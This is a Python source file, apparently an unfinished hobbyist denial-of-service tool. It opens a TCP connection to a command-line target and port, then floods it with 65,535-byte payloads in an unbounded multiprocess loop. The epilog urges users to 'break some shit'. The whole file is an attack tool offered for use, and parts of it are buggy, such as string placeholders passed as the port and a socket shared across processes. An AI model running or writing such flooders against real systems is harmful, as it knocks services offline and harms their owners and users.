import socket
import argparse
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, wait
import time

error_block = "[!]"
operation_block = "[*]"


'''
Little decorator note (still a newer concept to me), instead of running the function that the @ is above, it 
tells python to run the @function instead, and calls the function under the decorator in the process

'''
def execution_time(func):
    def wrapper(*args, **kwargs):
        start_time = time.time()
        result = func(*args, **kwargs)
        end_time = time.time()
        execution_time = end_time - start_time
        print(f"Execution time: {execution_time:.4f} seconds")
        return result
    return wrapper

class DOS:
    def __init__(self, target="127.0.0.1", port=0, requests=0):
        self.target = target
        self.port = int(port)
        self.requests = requests

    def __str__(self):
        return f"=== Scan Details: target: {self.target} port= {self.port} reqeusts {self.requests} ==="

    @execution_time
    def dos_scan(self):
        ## need to move this later, lots of options to consider here
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #sock.setblocking(False)
        sock.connect((self.target, self.port))

        data = ("*" * 65535).encode()

        if self.requests == 0:
            with ProcessPoolExecutor() as executor:
                while True:
                    futures = [executor.submit(self._socket_packetoverload_dos_implementation, self.target, "port", "packet_size", sock, data)]
        
        else:
            with ProcessPoolExecutor() as executor:
                for _ in range(1,self.requests):
                   print(_)
                   executor.submit(self._socket_packetoverload_dos_implementation, self.target, "port", "packet_size", sock, data)


    def _socket_connection_dos_implementation(self, ip="", port=1, packet_size=10, sock=None):
        '''
        The actual logic behind the DOS scan. Gets called for each request. This allows for
        additional handling/cleanliness/flexibility

        This is for general connection based DOSing, i.e connect and disconnect a ton of times

        Sock gets passed in here, because it's apparently faster to pass it
        '''
        #sock.send or sock.connect? 2 different types of DOS'ing

        #sock.connect
        try:
            sock.connect((self.target, self.port))

            #print("request")
            sock.close()
        except Exception as e:
            print(e)

        #sock.send(ip, port)
        #pass

    def _socket_packetoverload_dos_implementation(self, ip="", port=1, packet_size=10, sock=None, data=None):
        '''
        The actual logic behind the DOS scan. Gets called for each request. This allows for
        additional handling/cleanliness/flexibility

        Sock gets passed in here, because it's apparently faster to pass it
        '''
        try:
            sock.send(data)

        except Exception as e:
            print(e)

        #sock.send(ip, port)
        #pass

    def _http_dos_implementation(self, ip="", port=1, packet_size=10, sock=None):
        '''
        HTTP handler for HTTP specific DOSing
        '''
        pass

    


if __name__ == "__main__":
    '''Parser is down here for one-off runs, as this script can be imported & used in other pyprojects'''
    parser = argparse.ArgumentParser(
                        prog='qs-portscan',
                        description='The QuickScripts DOS module. No non-standard dependencies required',
                        epilog='-- Designed by ryanq.47 - get out there and break some shit :) --')

    parser.add_argument('-t', '--target', help="The target you wish to scan. Can be an IP, FQDN, or hostname. Example: 'qs-portscan -t 192.168.0.1'", required=True) 
    parser.add_argument('-p', '--port', help="The port of the service you are targeting", required=True) 
    parser.add_argument('-m', '--method', help="The method/protocl you want to use. These are optimized for specific applications, the default behavior is to just throw packets at the services",
                        default=10, type=int)

    #parser.add_argument('-r', '--rps', help="Requests per second (Is a goal, not a guaranteed rate)", default=1000000)
    #parser.add_argument('-r', '--requests', help="The amount of requests to send. 0 for unlimited", default=1000000, type=int)
    #parser.add_argument('-mx', '--multiplier', help="The request multiplier. Makes it easier to send a lot more requests. Default is 10x", default=1, type=int)
    parser.add_argument('-d', '--debug', help="Prints debug information", action="store_true")  

    args = parser.parse_args()

    # display -h/help if no flags are supplied
    if not any(vars(args).values()):
        parser.print_help()
        # the exit makes sure the class instances don't get created/cause any errors with no values
        exit()

    dos = DOS(
        target = args.target,
        port = args.port,
        # being finnicky, just letting it go as fast as it wants
        requests = 0#args.requests * args.multiplier

    )

    # Logic tree
    if args.debug:
        print(dos)

    # runtree
    dos.dos_scan()